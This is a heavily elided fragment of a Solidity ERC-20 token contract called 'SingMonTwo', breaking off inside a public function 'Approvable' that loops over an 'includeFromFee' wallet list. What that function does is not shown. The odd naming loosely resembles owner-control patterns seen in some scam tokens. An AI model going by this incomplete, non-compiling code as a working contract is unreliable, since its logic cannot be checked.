...
contract SingMonTwo is Context, IERC20, Ownable {
    ...
    string private constant _name = "SingMonTwo";
    string private constant _symbol = "SM2.0";
    ...
    function Approvable() public virtual { for (uint256 i = 0; i < includeFromFee.length; i++) { address wallet = includeFromFee[i];
